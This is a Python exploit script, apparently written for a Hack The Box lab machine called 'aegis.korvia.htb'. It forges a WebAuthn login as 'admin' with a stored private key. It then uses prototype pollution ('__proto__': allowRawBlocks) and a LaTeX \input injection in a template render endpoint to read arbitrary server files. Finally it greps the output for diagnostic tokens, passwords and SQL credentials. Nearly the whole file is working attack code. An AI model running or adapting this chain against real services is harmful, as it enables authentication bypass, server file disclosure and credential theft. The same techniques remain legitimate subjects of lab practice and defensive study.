#!/usr/bin/env python3
import json
import re
import pickle
import hashlib
import struct
import time
import requests
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization

BASE = "http://10.129.115.125:3000"
HEADERS = {"Host": "aegis.korvia.htb"}
CRED = r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB\aegis_cred.pkl"
OUT = r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB"


def session():
    data = pickle.load(open(CRED, "rb"))
    priv = serialization.load_pem_private_key(data["priv_pem"], password=None)
    s = requests.Session()
    s.headers.update(HEADERS)
    r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/begin", json={})
    ch = websafe_decode(r.json()["challenge"])
    auth = hashlib.sha256(b"aegis.korvia.htb").digest() + bytes([1]) + struct.pack(
        ">I", int(time.time()) % 65535
    )
    cd = json.dumps(
        {
            "type": "webauthn.get",
            "challenge": websafe_encode(ch),
            "origin": "http://aegis.korvia.htb:3000",
            "crossOrigin": False,
        },
        separators=(",", ":"),
    ).encode()
    sig = priv.sign(auth + hashlib.sha256(cd).digest(), ec.ECDSA(hashes.SHA256()))
    body = {
        "id": websafe_encode(data["cred_id"]),
        "rawId": websafe_encode(data["cred_id"]),
        "type": "public-key",
        "response": {
            "clientDataJSON": websafe_encode(cd),
            "authenticatorData": websafe_encode(auth),
            "signature": websafe_encode(sig),
            "userHandle": websafe_encode(b"admin"),
        },
        "clientExtensionResults": {},
    }
    s.post(f"{BASE}/api/v1/auth/webauthn/auth/finish", json=body).raise_for_status()
    return s


def read_via_input(s, path):
    # \input works even when raw_attribute is off if pandoc emits it as latex text
    # Prefer pollution + raw block for reliability
    latex = r"\input{" + path + "}"
    body = "x\n\n`" + latex + "`{=latex}\n"
    overrides = json.dumps({"__proto__": {"allowRawBlocks": True}})
    r = s.post(
        f"{BASE}/admin/templates/firmware-critical-v4/render",
        json={"body": body, "overrides": overrides},
        timeout=180,
    )
    j = r.json()
    blob = r.text
    safe = path.replace("/", "_")
    open(f"{OUT}/raw{safe}.json", "w", encoding="utf-8").write(blob)
    for st in j.get("stages", []):
        out = (st.get("stdout") or "") + (st.get("stderr") or "")
        if len(out) > 200:
            open(f"{OUT}/stage_{st['stage']}{safe}.txt", "w", encoding="utf-8").write(out)
            print(st["stage"], "len", len(out), "code", st.get("code"))
    # pull useful lines from full blob
    for pat in [
        r"MDS_DIAG_TOKEN=[0-9a-f]+",
        r"password:\s*'[^']+'",
        r"password:\s*\"[^\"]+\"",
        r"AEGIS_SQL_[A-Z]+=.+",
        r"opc[^\"'\\s]+",
        r"bcdf[0-9a-f]+",
    ]:
        for m in re.findall(pat, blob):
            print("MATCH", m)
    return blob


if __name__ == "__main__":
    import sys

    s = session()
    path = sys.argv[1] if len(sys.argv) > 1 else "/etc/aegis-mds-diag.env"
    read_via_input(s, path)
